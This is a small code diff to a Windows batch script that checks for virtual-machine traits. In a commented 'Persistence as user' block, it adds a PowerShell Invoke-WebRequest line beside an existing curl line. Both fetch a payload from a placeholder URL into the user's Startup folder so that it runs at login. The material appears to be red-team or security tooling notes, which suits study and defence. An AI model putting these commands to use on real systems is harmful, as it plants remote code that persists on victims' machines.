@@ -81,6 +81,7 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 :: Persistence as user
 ::    Download script to startup
 ::        curl.exe -kL <urltopayload> -o %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat
+::        powershell.exe -c Invoke-WebRequest -uri <urltopayload> -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat"
 
 :end
 pause
